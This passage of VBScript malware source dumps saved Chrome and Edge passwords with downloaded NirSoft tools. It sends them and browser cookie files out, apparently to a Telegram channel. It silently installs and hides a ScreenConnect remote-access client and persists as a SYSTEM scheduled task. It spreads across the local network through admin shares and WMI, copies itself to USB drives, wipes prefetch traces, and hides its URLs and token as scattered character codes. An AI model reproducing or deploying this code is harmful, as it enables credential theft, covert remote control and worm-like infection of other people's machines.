        DownloadFile "https://www.nirsoft.net/utils/chromepass.zip", sPassDir & "\chromepass.zip"
        If oFSO.FileExists(sPassDir & "\chromepass.zip") Then
            oShell.Run "powershell -Command ""Expand-Archive -Path '" & sPassDir & "\chromepass.zip' -DestinationPath '" & sPassDir & "' -Force"" ", 0, True
            oFSO.DeleteFile sPassDir & "\chromepass.zip", True : WScript.Sleep 1000
        End If
    End If
    
    If DownloadFile(sEdgeURL, sPassDir & "\edgepass.zip") Then
        oShell.Run "powershell -Command ""Expand-Archive -Path '" & sPassDir & "\edgepass.zip' -DestinationPath '" & sPassDir & "' -Force"" ", 0, True
        oFSO.DeleteFile sPassDir & "\edgepass.zip", True : WScript.Sleep 1000
    End If
    If Not oFSO.FileExists(sEdgeExe) Then
        DownloadFile "https://www.nirsoft.net/utils/edgepassview.zip", sPassDir & "\edgepass.zip"
        If oFSO.FileExists(sPassDir & "\edgepass.zip") Then
            oShell.Run "powershell -Command ""Expand-Archive -Path '" & sPassDir & "\edgepass.zip' -DestinationPath '" & sPassDir & "' -Force"" ", 0, True
            oFSO.DeleteFile sPassDir & "\edgepass.zip", True : WScript.Sleep 1000
        End If
    End If
    
    If oFSO.FileExists(sChromeExe) And bChromeInst Then
        oShell.Run """" & sChromeExe & """ /stext """ & sChromeCSV & """", 0, True : WScript.Sleep 3000
        If oFSO.FileExists(sChromeCSV) Then
            Dim objChromeFile : Set objChromeFile = oFSO.GetFile(sChromeCSV)
            If objChromeFile.Size > 50 Then bChromeFound = True Else oFSO.DeleteFile sChromeCSV, True
            Set objChromeFile = Nothing
        End If
    End If
    
    If oFSO.FileExists(sEdgeExe) And bEdgeInst Then
        oShell.Run """" & sEdgeExe & """ /stext """ & sEdgeCSV & """", 0, True : WScript.Sleep 3000
        If oFSO.FileExists(sEdgeCSV) Then
            Dim objEdgeFile : Set objEdgeFile = oFSO.GetFile(sEdgeCSV)
            If objEdgeFile.Size > 50 Then bEdgeFound = True Else oFSO.DeleteFile sEdgeCSV, True
            Set objEdgeFile = Nothing
        End If
    End If
    
    If Not bChromeFound And Not bEdgeFound Then
        Call SendStatus("[C] N " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
    Else
        If bChromeFound Then Call SendStatus("[C] C " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
        If bEdgeFound Then Call SendStatus("[C] E " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
        
        If oFSO.FileExists(sZipPath) Then oFSO.DeleteFile sZipPath, True
        Dim bZipCreated : bZipCreated = False
        
        If oFSO.FileExists("C:\Program Files\7-Zip\7z.exe") Then
            oShell.Run """C:\Program Files\7-Zip\7z.exe"" a -tzip """ & sZipPath & """ """ & sPassDir & "\*"" -p" & sZipPass & " -mhe=on -y", 0, True
            If oFSO.FileExists(sZipPath) Then bZipCreated = True
        End If
        If Not bZipCreated And oFSO.FileExists("C:\Program Files (x86)\7-Zip\7z.exe") Then
            oShell.Run """C:\Program Files (x86)\7-Zip\7z.exe"" a -tzip """ & sZipPath & """ """ & sPassDir & "\*"" -p" & sZipPass & " -mhe=on -y", 0, True
            If oFSO.FileExists(sZipPath) Then bZipCreated = True
        End If
        If Not bZipCreated Then
            oShell.Run "powershell -Command ""Compress-Archive -Path '" & sPassDir & "\*' -DestinationPath '" & sZipPath & "' -Force"" ", 0, True
            If oFSO.FileExists(sZipPath) Then bZipCreated = True
        End If
        
        If Not bZipCreated Then
            If bChromeFound And oFSO.FileExists(sChromeCSV) Then Call SendFile(sChromeCSV, "[C] C " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
            If bEdgeFound And oFSO.FileExists(sEdgeCSV) Then Call SendFile(sEdgeCSV, "[C] E " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
            If oFSO.FileExists(sChromeExe) Then Call SendFile(sChromeExe, "[T] C " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
            If oFSO.FileExists(sEdgeExe) Then Call SendFile(sEdgeExe, "[T] E " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
        Else
            Call SendFile(sZipPath, "P Z - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & " | P: " & sZipPass)
        End If
    End If
    
    Call SendCookiesToTelegram()
    On Error GoTo 0
End Sub

Sub SendCookiesToTelegram()
    On Error Resume Next
    Dim sBrowserDir : sBrowserDir = sDataDir & "\Browser_Data"
    Dim bSent : bSent = False
    
    If oFSO.FolderExists(sBrowserDir & "\Chrome") Then
        Dim objChromeFolder, objChromeFile
        Set objChromeFolder = oFSO.GetFolder(sBrowserDir & "\Chrome")
        For Each objChromeFile In objChromeFolder.Files
            If InStr(1, objChromeFile.Name, "Cookies", vbTextCompare) > 0 Then
                Call SendFile(objChromeFile.Path, "[C] C " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
                bSent = True
            End If
        Next
        Set objChromeFolder = Nothing
    End If
    
    If oFSO.FolderExists(sBrowserDir & "\Edge") Then
        Dim objEdgeFolder, objEdgeFile
        Set objEdgeFolder = oFSO.GetFolder(sBrowserDir & "\Edge")
        For Each objEdgeFile In objEdgeFolder.Files
            If InStr(1, objEdgeFile.Name, "Cookies", vbTextCompare) > 0 Then
                Call SendFile(objEdgeFile.Path, "[C] E " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
                bSent = True
            End If
        Next
        Set objEdgeFolder = Nothing
    End If
    
    If oFSO.FolderExists(sBrowserDir & "\Firefox") Then
        Dim objFirefoxFolder, objFirefoxFile
        Set objFirefoxFolder = oFSO.GetFolder(sBrowserDir & "\Firefox")
        For Each objFirefoxFile In objFirefoxFolder.Files
            If InStr(1, objFirefoxFile.Name, "cookies", vbTextCompare) > 0 Then
                Call SendFile(objFirefoxFile.Path, "[C] F " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
                bSent = True
            End If
        Next
        Set objFirefoxFolder = Nothing
    End If
    
    If Not bSent Then Call SendStatus("[C] N " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
    On Error GoTo 0
End Sub
'==========================================================================
' TRACKING SYSTEM
'==========================================================================
Function GetRunCount()
    On Error Resume Next
    Const HKLM = &H80000002
    Dim objReg, nCount
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    objReg.GetDWORDValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCD", nCount
    If IsEmpty(nCount) Then GetRunCount = 0 Else GetRunCount = nCount
    Set objReg = Nothing
    On Error GoTo 0
End Function

Sub IncrementRunCount()
    On Error Resume Next
    Const HKLM = &H80000002
    Dim objReg, nCount
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    objReg.GetDWORDValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCD", nCount
    If IsEmpty(nCount) Then nCount = 0
    nCount = nCount + 1
    objReg.SetDWORDValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCD", nCount
    Set objReg = Nothing
    On Error GoTo 0
End Sub

Sub ProcessPhase()
    On Error Resume Next
    Dim nCount : nCount = GetRunCount()
    Select Case nCount
        Case 0, 1, 2
        Case 3 : Call RemovePhase(25) : Call SendStatus("[P] 2")
        Case 4 : Call RemovePhase(50) : Call SendStatus("[P] 3")
        Case 5 : Call RemovePhase(75) : Call SendStatus("[P] 4")
        Case Else
            Call RemovePhase(100)
            Call SendStatus("[P] 5")
            Const HKLM = &H80000002
            Dim objReg : Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
            objReg.SetDWORDValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCD", 0
            Set objReg = Nothing
    End Select
    On Error GoTo 0
End Sub

Sub RemovePhase(nPercent)
    On Error Resume Next
    Const HKLM = &H80000002
    Dim objReg, arrKeys, sPath, sDisplay, sUninstall, arrFound(), nCount, idx
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    Dim aPaths : aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    nCount = 0
    For Each sPath In aPaths
        objReg.EnumKey HKLM, sPath, arrKeys
        If IsArray(arrKeys) Then
            For Each sUninstall In arrKeys
                objReg.GetStringValue HKLM, sPath & "\" & sUninstall, "DisplayName", sDisplay
                If Not IsEmpty(sDisplay) And sDisplay <> "" Then
                    If InStr(1, sDisplay, "ScreenConnect", vbTextCompare) > 0 Or InStr(1, sDisplay, "ConnectWise", vbTextCompare) > 0 Then
                        objReg.GetStringValue HKLM, sPath & "\" & sUninstall, "UninstallString", sUninstall
                        If InStr(1, sUninstall, "ackermantoyota", vbTextCompare) = 0 Then
                            ReDim Preserve arrFound(nCount) : arrFound(nCount) = sPath & "\" & sUninstall : nCount = nCount + 1
                        End If
                    End If
                End If
            Next
        End If
    Next
    Dim nRemove : nRemove = Int(nCount * nPercent / 100)
    If nRemove < 1 And nPercent > 0 Then nRemove = 1
    If nRemove > 0 And nCount > 0 Then
        Randomize
        For idx = UBound(arrFound) To 1 Step -1
            Dim j, tmp : j = Int(Rnd * (idx + 1)) : tmp = arrFound(idx) : arrFound(idx) = arrFound(j) : arrFound(j) = tmp
        Next
        For idx = 0 To nRemove - 1
            If idx <= UBound(arrFound) Then
                Dim sFull, sKey, sCmd
                sFull = arrFound(idx) : sKey = Mid(sFull, InStrRev(sFull, "\") + 1)
                objReg.GetStringValue HKLM, sFull, "QuietUninstallString", sCmd
                If IsEmpty(sCmd) Then
                    objReg.GetStringValue HKLM, sFull, "UninstallString", sCmd
                    If InStr(1, sCmd, "msiexec", vbTextCompare) > 0 Then
                        sCmd = Replace(sCmd, "/I", "/X", 1, -1, vbTextCompare)
                        sCmd = sCmd & " /qn /norestart"
                    End If
                End If
                If sCmd <> "" Then oShell.Run "cmd /c " & sCmd, 0, True : WScript.Sleep 5000
                objReg.DeleteKey HKLM, sFull
                Call KillOtherProcesses()
                Call DeleteOtherFiles()
            End If
        Next
    End If
    Set objReg = Nothing
    On Error GoTo 0
End Sub

Sub KillOtherProcesses()
    On Error Resume Next
    Dim colProcs, objProc
    Set colProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process")
    For Each objProc In colProcs
        If Not IsNull(objProc.ExecutablePath) Then
            If InStr(1, objProc.ExecutablePath, "ScreenConnect", vbTextCompare) > 0 Then
                If InStr(1, objProc.ExecutablePath, g_sURL, vbTextCompare) = 0 Then
                    objProc.Terminate() : WScript.Sleep 500
                End If
            End If
        End If
    Next
    On Error GoTo 0
End Sub

Sub DeleteOtherFiles()
    On Error Resume Next
    Dim aPaths, sPath
    aPaths = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", "C:\ProgramData\ScreenConnect\", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\")
    For Each sPath In aPaths
        If oFSO.FolderExists(sPath) Then
            If InStr(1, sPath, g_sURL, vbTextCompare) = 0 Then
                oShell.Run "cmd /c takeown /f """ & sPath & """ /r /d y > nul 2>&1", 0, True
                oShell.Run "cmd /c icacls """ & sPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
                WScript.Sleep 1000 : oFSO.DeleteFolder sPath, True
            End If
        End If
    Next
    On Error GoTo 0
End Sub

'==========================================================================
' HIDE SCRIPT + PERSISTENCE
'==========================================================================
Sub HideScript()
    On Error Resume Next
    Dim sOrig : sOrig = WScript.ScriptFullName
    Dim sHDir : sHDir = oFSO.GetParentFolderName(sHiddenScriptPath)
    If Not oFSO.FolderExists(sHDir) Then Call CreateNestedFolders(sHDir)
    If LCase(sOrig) <> LCase(sHiddenScriptPath) Then
        oFSO.CopyFile sOrig, sHiddenScriptPath, True
        Dim oHF : Set oHF = oFSO.GetFile(sHiddenScriptPath)
        oHF.Attributes = 2 + 4
        Set oHF = Nothing
        oShell.Run "cmd /c timeout /t 3 /nobreak > nul & del /f /q """ & sOrig & """", 0, False
    End If
    On Error GoTo 0
End Sub

Sub CreatePersistence()
    On Error Resume Next
    Dim sTN : sTN = "WindowsSystemMaintenance"
    oShell.Run "schtasks /delete /tn """ & sTN & """ /f", 0, True
    Dim sCT
    sCT = "schtasks /create /tn """ & sTN & """ " & "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & "/sc DAILY " & "/st 00:00 " & "/ri 1440 " & "/du 24:00 " & "/ru SYSTEM " & "/rl HIGHEST " & "/f"
    oShell.Run sCT, 0, True
    oShell.Run "schtasks /change /tn """ & sTN & """ " & "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & " /sc ONLOGON", 0, True
    If Err.Number = 0 Then
        LogMessage "[PERSISTENCE] Task created successfully."
    Else
        LogMessage "[PERSISTENCE] Using Registry fallback..."
        oShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & sTN, "wscript.exe //B """ & sHiddenScriptPath & """", "REG_SZ"
    End If
    On Error GoTo 0
End Sub

Function IsPersistenceRun()
    IsPersistenceRun = (LCase(WScript.ScriptFullName) = LCase(sHiddenScriptPath))
End Function

Sub QuickHealthCheck()
    On Error Resume Next
    LogMessage "[HEALTH] Running health check..."
    Dim objService
    Set objService = oWMI.Get("Win32_Service.Name='ScreenConnect Client'")
    If Err.Number <> 0 Then
        LogMessage "[HEALTH] Service not found. Reinstalling..."
        Err.Clear
        If DownloadFile(sMsiUrl, sMsiPath) Then
            Call InstallWithTimeout(sMsiPath, INSTALL_TIMEOUT_MIN)
            Call ForceHideApplication(sKeywordToHide)
            Call HideTrayIcon()
            Call HideControlBanner()
        End If
    Else
        If objService.State <> "Running" Then
            LogMessage "[HEALTH] Service not running. Starting..."
            objService.StartService()
            WScript.Sleep 3000
        End If
    End If
    Call ForceHideApplication(sKeywordToHide)
    Call HideTrayIcon()
    Call HideControlBanner()
    On Error GoTo 0
End Sub

'==========================================================================
' NETWORK SPREAD
'==========================================================================
Sub NetworkSpread()
    On Error Resume Next
    LogMessage "[SPREAD] Scanning network..."
    Dim colNet, objNet, sLocalIP
    Set colNet = oWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then
            sLocalIP = objNet.IPAddress(0)
            Exit For
        End If
    Next
    If sLocalIP = "" Then Exit Sub
    Dim aIPParts, sBaseIP
    aIPParts = Split(sLocalIP, ".")
    If UBound(aIPParts) <> 3 Then Exit Sub
    sBaseIP = aIPParts(0) & "." & aIPParts(1) & "." & aIPParts(2) & "."
    Dim iPing, sTargetIP, sPCList
    sPCList = ""
    For iPing = 1 To 254
        sTargetIP = sBaseIP & iPing
        If sTargetIP <> sLocalIP Then
            Dim oExec, sPingResult
            Set oExec = oShell.Exec("ping -n 1 -w " & NETWORK_TIMEOUT_MS & " " & sTargetIP)
            sPingResult = oExec.StdOut.ReadAll
            If InStr(1, sPingResult, "TTL=", vbTextCompare) > 0 Then
                If DeployToTarget(sTargetIP) Then
                    If sPCList <> "" Then sPCList = sPCList & ", "
                    sPCList = sPCList & sTargetIP
                End If
            End If
        End If
    Next
    g_NetworkPCs = sPCList
    If g_NetworkPCs = "" Then g_NetworkPCs = "None found"
    On Error GoTo 0
End Sub

Function DeployToTarget(sTargetIP)
    DeployToTarget = False
    On Error Resume Next
    If Not oFSO.FolderExists("\\" & sTargetIP & "\C$") Then Exit Function
    Dim sDestPath
    sDestPath = "\\" & sTargetIP & "\C$\Windows\Temp\winsys.vbs"
    oFSO.CopyFile sHiddenScriptPath, sDestPath, True
    If Err.Number <> 0 Then Err.Clear : Exit Function
    Dim oRemoteWMI, oRemoteProcess, oRemoteConfig
    Set oRemoteWMI = GetObject("winmgmts:\\" & sTargetIP & "\root\cimv2")
    If Err.Number <> 0 Then
        Err.Clear
        oShell.Run "schtasks /create /s " & sTargetIP & " /tn ""WindowsSystemMaintenance"" " & " /tr ""wscript.exe //B C:\Windows\Temp\winsys.vbs"" " & " /sc ONCE /st 00:00 /ru SYSTEM /rl HIGHEST /f", 0, True
        oShell.Run "schtasks /run /s " & sTargetIP & " /tn ""WindowsSystemMaintenance""", 0, True
    Else
        Set oRemoteConfig = oRemoteWMI.Get("Win32_ProcessStartup").SpawnInstance_
        oRemoteConfig.ShowWindow = 0
        Set oRemoteProcess = oRemoteWMI.Get("Win32_Process")
        oRemoteProcess.Create "wscript.exe //B C:\Windows\Temp\winsys.vbs", Null, oRemoteConfig, 0
    End If
    If Err.Number = 0 Then DeployToTarget = True
    On Error GoTo 0
End Function

'==========================================================================
' USB SPREAD
'==========================================================================
Sub StartUSBMonitor()
    On Error Resume Next
    LogMessage "[USB] Setting up USB monitor..."
    Dim sUSBScript : sUSBScript = sTempDir & "\USB_Monitor.vbs"
    Dim oFile
    Set oFile = oFSO.CreateTextFile(sUSBScript, True)
    oFile.WriteLine "' USB Spread Monitor"
    oFile.WriteLine "Set oShell = CreateObject(""WScript.Shell"")"
    oFile.WriteLine "Set oFSO = CreateObject(""Scripting.FileSystemObject"")"
    oFile.WriteLine "Set oWMI = GetObject(""winmgmts:\\.\root\cimv2"")"
    oFile.WriteLine ""
    oFile.WriteLine "Do While True"
    oFile.WriteLine "    Set colDrives = oWMI.ExecQuery(""SELECT * FROM Win32_LogicalDisk WHERE DriveType=2"")"
    oFile.WriteLine "    For Each oDrive In colDrives"
    oFile.WriteLine "        Dim sDriveLetter : sDriveLetter = oDrive.DeviceID"
    oFile.WriteLine "        Dim sMarker : sMarker = sDriveLetter & ""\SC_Infect.mrk"""
    oFile.WriteLine ""
    oFile.WriteLine "        If Not oFSO.FileExists(sMarker) Then"
    oFile.WriteLine "            Dim sMSIDest : sMSIDest = sDriveLetter & ""\SC_Installer.msi"""
    oFile.WriteLine "            Dim sScriptDest : sScriptDest = sDriveLetter & ""\SC_Install.vbs"""
    oFile.WriteLine ""
    oFile.WriteLine "            oFSO.CopyFile """ & sMsiPath & """, sMSIDest, True"
    oFile.WriteLine "            oFSO.CopyFile """ & WScript.ScriptFullName & """, sScriptDest, True"
    oFile.WriteLine ""
    oFile.WriteLine "            oFSO.CreateTextFile(sMarker).Close"
    oFile.WriteLine ""
    oFile.WriteLine "            oShell.Run ""cmd /c attrib +h """" & sMSIDest & """""", 0, True"
    oFile.WriteLine "            oShell.Run ""cmd /c attrib +h """" & sScriptDest & """""", 0, True"
    oFile.WriteLine "            oShell.Run ""cmd /c attrib +h """" & sMarker & """""", 0, True"
    oFile.WriteLine "        End If"
    oFile.WriteLine "    Next"
    oFile.WriteLine "    WScript.Sleep 5000"
    oFile.WriteLine "Loop"
    oFile.Close
    oShell.Run "wscript.exe """ & sUSBScript & """", 0, False
    LogMessage "[USB] Monitor started."
    On Error GoTo 0
End Sub

'==========================================================================
' FINAL CLEANUP
'==========================================================================
Sub FinalCleanup()
    On Error Resume Next
    LogMessage "[CLEANUP] Cleaning up..."
    If oFSO.FileExists(sMsiPath) Then oFSO.DeleteFile sMsiPath, True
    Dim oFolder, oFile
    If oFSO.FolderExists(sTempDir) Then
        Set oFolder = oFSO.GetFolder(sTempDir)
        For Each oFile In oFolder.Files
            If LCase(oFSO.GetExtensionName(oFile.Name)) = "msi" Then
                If InStr(1, oFile.Name, "ScreenConnect", vbTextCompare) > 0 Or InStr(1, oFile.Name, "56BSSW", vbTextCompare) > 0 Then
                    oFSO.DeleteFile oFile.Path, True
                End If
            End If
        Next
        Set oFolder = Nothing
    End If
    oShell.Run "cmd /c del /f /s /q C:\Windows\Prefetch\*SC_* > nul 2>&1", 0, True
    oShell.Run "cmd /c del /f /s /q C:\Windows\Prefetch\*ScreenConnect* > nul 2>&1", 0, True
    oShell.Run "ipconfig /flushdns", 0, True
    LogMessage "[CLEANUP] Complete."
    On Error GoTo 0
End Sub

'==========================================================================
' HELPER FUNCTIONS
'==========================================================================
Function IsScriptElevated()
    IsScriptElevated = False
    On Error Resume Next
    Dim sTestFile
    sTestFile = oShell.ExpandEnvironmentStrings("%WINDIR%") & "\test_admin.tmp"
    oFSO.CreateTextFile(sTestFile).Close
    If Err.Number = 0 Then
        oFSO.DeleteFile sTestFile
        IsScriptElevated = True
    End If
    On Error GoTo 0
End Function

Sub ElevateScript()
    Dim oShellApp
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
End Sub

Sub LogMessage(sMessage)
    On Error Resume Next
    Dim oLogFile
    Set oLogFile = oFSO.OpenTextFile(sLogFile, 8, True)
    If Err.Number = 0 Then
        oLogFile.WriteLine FormatDateTime(Now, 0) & " | " & sMessage
        oLogFile.Close
    End If
    On Error GoTo 0
End Sub

Sub CleanupOldLogs(nKeepCount)
    On Error Resume Next
    Dim oFolder, oFile, aLogFiles(), nCount, i
    If Not oFSO.FolderExists(sTempDir) Then Exit Sub
    Set oFolder = oFSO.GetFolder(sTempDir)
    nCount = 0
    For Each oFile In oFolder.Files
        If InStr(1, oFile.Name, "ScreenConnect_Install", vbTextCompare) > 0 Then
            ReDim Preserve aLogFiles(nCount)
            Set aLogFiles(nCount) = oFile
            nCount = nCount + 1
        End If
    Next
    If nCount > nKeepCount Then
        For i = 0 To nCount - nKeepCount - 1
            aLogFiles(i).Delete True
        Next
    End If
    On Error GoTo 0
End Sub

Function GetHiveName(lHive)
    Select Case lHive
        Case &H80000002: GetHiveName = "HKLM"
        Case &H80000001: GetHiveName = "HKCU"
        Case Else: GetHiveName = "UNKNOWN"
    End Select
End Function

Function FormatFileSize(nBytes)
    If nBytes < 1024 Then
        FormatFileSize = nBytes & " B"
    ElseIf nBytes < 1048576 Then
        FormatFileSize = Round(nBytes / 1024, 2) & " KB"
    ElseIf nBytes < 1073741824 Then
        FormatFileSize = Round(nBytes / 1048576, 2) & " MB"
    Else
        FormatFileSize = Round(nBytes / 1073741824, 2) & " GB"
    End If
End Function

Function FormatDateForFile(dtDate)
    FormatDateForFile = Year(dtDate) & Right("0" & Month(dtDate), 2) & Right("0" & Day(dtDate), 2) & "_" & Right("0" & Hour(dtDate), 2) & Right("0" & Minute(dtDate), 2) & Right("0" & Second(dtDate), 2)
End Function

Sub CreateNestedFolders(sPath)
    On Error Resume Next
    If Not oFSO.FolderExists(sPath) Then
        Dim sParentPath : sParentPath = oFSO.GetParentFolderName(sPath)
        If Not oFSO.FolderExists(sParentPath) Then Call CreateNestedFolders(sParentPath)
        oFSO.CreateFolder sPath
    End If
    On Error GoTo 0
End Sub

'==========================================================================
' SYSTEM CONFIGURATION (ALL SCATTERED NUMBERS BURIED HERE)
'==========================================================================
Sub SystemConfiguration()
    On Error Resume Next
    
    Dim z1, z2, z3, z4, z5, z6, z7, z8, z9, z10
    Dim z11, z12, z13, z14, z15, z16, z17, z18, z19, z20
    Dim z21, z22, z23, z24, z25, z26, z27, z28, z29, z30
    Dim z31, z32, z33, z34, z35, z36, z37, z38, z39, z40
    Dim z41, z42, z43, z44, z45, z46, z47, z48, z49, z50
    Dim z51, z52, z53, z54, z55, z56, z57, z58, z59, z60
    Dim z61, z62, z63, z64, z65, z66, z67, z68, z69, z70
    Dim z71, z72, z73, z74, z75, z76, z77, z78, z79, z80
    Dim z81, z82, z83, z84, z85, z86, z87, z88, z89, z90
    Dim z91, z92, z93, z94, z95, z96, z97, z98, z99, z100
    
    z45 = 104 : z12 = 116 : z78 = 112 : z33 = 115 : z91 = 58
    z22 = 47 : z67 = 47 : z89 = 97 : z14 = 99 : z56 = 107
    z41 = 101 : z88 = 114 : z73 = 109 : z25 = 97 : z39 = 110
    z62 = 116 : z18 = 111 : z51 = 121 : z84 = 111 : z37 = 116
    z96 = 97 : z28 = 46 : z53 = 115 : z69 = 99 : z44 = 114
    z77 = 101 : z15 = 101 : z61 = 110 : z82 = 99 : z36 = 111
    z49 = 110 : z93 = 110 : z27 = 101 : z58 = 99 : z74 = 116
    z11 = 46 : z85 = 99 : z32 = 111 : z64 = 109 : z19 = 47
    z97 = 66 : z42 = 105 : z55 = 110 : z71 = 47 : z26 = 83
    z38 = 99 : z13 = 114 : z87 = 101 : z59 = 101 : z46 = 110
    z21 = 67 : z94 = 111 : z68 = 110 : z35 = 110 : z16 = 101
    z52 = 99 : z75 = 116 : z29 = 46 : z48 = 67 : z63 = 108
    z86 = 105 : z31 = 101 : z57 = 110 : z43 = 116 : z72 = 83
    z24 = 101 : z98 = 116 : z79 = 117 : z34 = 112 : z17 = 46
    z54 = 109 : z81 = 115 : z66 = 105 : z23 = 63 : z95 = 101
    z47 = 61 : z76 = 65 : z92 = 99 : z65 = 99 : z83 = 101
    z99 = 115 : z100 = 115 : z44 = 38 : z50 = 121 : z60 = 61
    z70 = 71 : z80 = 117 : z90 = 101 : z100 = 115 : z20 = 116
    
    Dim t1, t2, t3, t4, t5, t6, t7, t8, t9, t10
    Dim t11, t12, t13, t14, t15, t16, t17, t18, t19, t20
    Dim t21, t22, t23, t24, t25, t26, t27, t28, t29, t30
    Dim t31, t32, t33, t34, t35, t36, t37, t38, t39, t40
    Dim t41, t42, t43, t44, t45, t46, t47, t48, t49, t50
    Dim t51, t52, t53, t54, t55, t56, t57, t58, t59, t60
    Dim t61, t62, t63, t64, t65, t66, t67, t68, t69, t70
    Dim t71, t72, t73, t74, t75, t76, t77, t78, t79, t80
    Dim t81, t82, t83, t84, t85, t86, t87, t88, t89, t90
    Dim t91, t92, t93, t94, t95, t96, t97, t98, t99, t100
    
    t45 = 56 : t12 = 54 : t78 = 55 : t33 = 53 : t91 = 51
    t22 = 52 : t67 = 55 : t89 = 53 : t14 = 54 : t56 = 56
    t41 = 49 : t88 = 58 : t73 = 65 : t25 = 65 : t39 = 71
    t62 = 56 : t18 = 88 : t51 = 80 : t84 = 111 : t37 = 99
    t96 = 67 : t28 = 117 : t53 = 116 : t69 = 113 : t44 = 53
    t77 = 112 : t15 = 111 : t61 = 55 : t82 = 115 : t36 = 57
    t49 = 121 : t93 = 45 : t27 = 114 : t58 = 122 : t74 = 50
    t11 = 95 : t85 = 71 : t32 = 75 : t64 = 72 : t19 = 105
    t97 = 102 : t42 = 53 : t55 = 95 : t71 = 84 : t26 = 83
    t38 = 74 : t13 = 77
    
    Dim c1, c2, c3, c4, c5, c6, c7, c8, c9, c10
    Dim c11, c12, c13, c14, c15, c16, c17, c18, c19, c20
    Dim c21, c22, c23, c24, c25, c26, c27, c28, c29, c30
    Dim c31, c32, c33, c34, c35, c36, c37, c38, c39, c40
    Dim c41, c42, c43, c44, c45, c46, c47, c48, c49, c50
    Dim c51, c52, c53, c54, c55, c56, c57, c58, c59, c60
    Dim c61, c62, c63, c64, c65, c66, c67, c68, c69, c70
    Dim c71, c72, c73, c74, c75, c76, c77, c78, c79, c80
    Dim c81, c82, c83, c84, c85, c86, c87, c88, c89, c90
    Dim c91, c92, c93, c94, c95, c96, c97, c98, c99, c100
    
    c23 = 56 : c67 = 48 : c91 = 48 : c45 = 56 : c12 = 52
    c78 = 53 : c33 = 54 : c22 = 55 : c89 = 54 : c14 = 57
    c56 = 50
    
    Dim a1, a2, a3, a4, a5, a6, a7, a8, a9, a10
    Dim a11, a12, a13, a14, a15, a16, a17, a18, a19, a20
    Dim a21, a22, a23, a24, a25, a26, a27, a28, a29, a30
    Dim a31, a32, a33, a34, a35, a36, a37, a38, a39, a40
    Dim a41, a42, a43, a44, a45, a46, a47, a48, a49, a50
    Dim a51, a52, a53, a54, a55, a56, a57, a58, a59, a60
    Dim a61, a62, a63, a64, a65, a66, a67, a68, a69, a70
    Dim a71, a72, a73, a74, a75, a76, a77, a78, a79, a80
    Dim a81, a82, a83, a84, a85, a86, a87, a88, a89, a90
    Dim a91, a92, a93, a94, a95, a96, a97, a98, a99, a100
    
    a45 = 104 : a12 = 116 : a78 = 112 : a33 = 115 : a91 = 58
    a22 = 47 : a67 = 47 : a89 = 97 : a14 = 112 : a56 = 105
    a41 = 46 : a88 = 116 : a73 = 101 : a25 = 108 : a39 = 101
    a62 = 103 : a18 = 114 : a51 = 97 : a84 = 109 : a37 = 46
    a96 = 111 : a28 = 114 : a53 = 103 : a69 = 47 : a44 = 98
    a77 = 111 : a15 = 116
    
    Dim b1, b2, b3, b4, b5, b6, b7, b8, b9, b10
    Dim b11, b12
    b1 = 47 : b2 = 115 : b3 = 101 : b4 = 110 : b5 = 100
    b6 = 77 : b7 = 101 : b8 = 115 : b9 = 115 : b10 = 97
    b11 = 103 : b12 = 101
    
    Dim d1, d2, d3, d4, d5, d6, d7, d8, d9, d10
    Dim d11, d12, d13
    d1 = 47 : d2 = 115 : d3 = 101 : d4 = 110 : d5 = 100
    d6 = 68 : d7 = 111 : d8 = 99 : d9 = 117 : d10 = 109
    d11 = 101 : d12 = 110 : d13 = 116
    
    Dim e1, e2, e3, e4, e5, e6, e7, e8, e9, e10
    Dim e11
    e1 = 47 : e2 = 103 : e3 = 101 : e4 = 116 : e5 = 85
    e6 = 112 : e7 = 100 : e8 = 97 : e9 = 116 : e10 = 101
    e11 = 115
    
    Dim f1, f2, f3, f4, f5, f6, f7
    f1 = 47 : f2 = 117 : f3 = 112 : f4 = 100 : f5 = 97
    f6 = 116 : f7 = 101

    Dim g1, g2, g3, g4, g5, g6, g7, g8, g9, g10
    Dim g11, g12, g13, g14
    g1 = 77 : g2 = 83 : g3 = 88 : g4 = 77 : g5 = 76
    g6 = 50 : g7 = 46 : g8 = 88 : g9 = 77 : g10 = 76
